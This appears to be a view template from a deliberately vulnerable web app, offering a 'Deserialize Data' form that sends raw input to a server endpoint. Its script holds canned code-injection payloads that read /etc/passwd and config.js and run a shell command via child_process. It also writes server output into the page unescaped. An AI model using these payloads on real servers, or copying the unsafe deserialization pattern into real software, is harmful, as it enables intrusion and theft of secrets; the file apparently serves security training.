<div class="container" style="padding:40px 0;">
  <div style="max-width:600px;margin:0 auto;">
    <div class="section-title">
      <h2>📦 Data Processor</h2>
      <p class="subtitle">Parse and process structured data</p>
      <div class="accent-line"></div>
    </div>

    <% if (error) { %>
      <div class="alert alert-danger">⚠️ <%= error %></div>
    <% } %>

    <div class="card" style="padding:24px;margin-bottom:20px;">
      <h3 style="margin-bottom:16px;">Deserialize Data</h3>
      <div class="form-group">
        <label class="form-label">JSON Data</label>
        <textarea id="deserialize-input" class="form-textarea" rows="6" style="font-family:'JetBrains Mono',monospace;font-size:0.85rem;">{"name":"Tony","suit":"Mark LXXXV","power":9001}</textarea>
      </div>
      <button onclick="deserialize()" class="btn btn-primary btn-lg" style="width:100%;">⚡ Deserialize</button>
    </div>

    <div id="deserialize-result" style="display:none;"></div>

  </div>
</div>

<script>
async function deserialize() {
  const rawInput = document.getElementById('deserialize-input').value.trim();
  if (!rawInput) return;
  const res = await fetch('/api/deserialize?raw=' + encodeURIComponent(rawInput), { method: 'POST' });
  const result = await res.json();
  const el = document.getElementById('deserialize-result');
  el.style.display = 'block';
  if (result.deserialized) {
    el.innerHTML = `<div class="card" style="padding:24px;border-color:var(--success);">
      <h4 style="margin-bottom:12px;color:var(--success);">✅ Deserialized Successfully</h4>
      <pre style="background:var(--dark-2);padding:12px;border-radius:4px;overflow-x:auto;">${JSON.stringify(result.deserialized, null, 2)}</pre>
    </div>`;
  } else {
    el.innerHTML = `<div class="card" style="padding:24px;border-color:var(--danger);">
      <h4 style="color:var(--danger);margin-bottom:12px;">❌ ${result.error}</h4>
    </div>`;
  }
}

async function sendPayload(type) {
  const payloads = {
    fs: "{r: require('fs').readFileSync('/etc/passwd','utf8')}",
    exec: "{r: require('child_process').execSync('id').toString()}",
    config: "{r: require('fs').readFileSync('config.js','utf8')}"
  };
  document.getElementById('deserialize-input').value = payloads[type];
  await deserialize();
}
</script>
